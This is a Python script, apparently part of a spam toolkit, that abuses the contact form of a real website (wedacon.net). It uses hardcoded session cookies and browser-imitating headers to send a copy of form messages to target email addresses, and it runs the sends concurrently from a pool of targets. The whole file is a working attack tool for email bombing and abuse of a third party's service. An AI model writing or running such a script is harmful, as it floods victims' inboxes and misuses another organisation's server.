from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '87be92eafb428f990905d0b2d3555241',
    '_pk_ref.1.3940': '%5B%22%22%2C%22%22%2C1676368407%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.1.3940': 'ea6c5fcc164d7ca9.1676366137.2.1676368407.1676368407.',
    '_pk_ses.1.3940': '1',
}

headers = {
    'authority': 'www.wedacon.net',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.wedacon.net',
    'referer': 'https://www.wedacon.net/contact.html',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'category': '2',
            'subject': self.get_text(False),
            'priority': '5',
            'copy': 'true',
            'human': 'TRUE',
            'message': 'message',
        }

        response = requests.post('https://www.wedacon.net/php/contact_form.php', cookies=cookies, headers=headers,
                                 data=data)
        return response


def main():
    s = '"success":true'

    spam = ConcreteSpam(basename(__file__)[:-3], s, target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
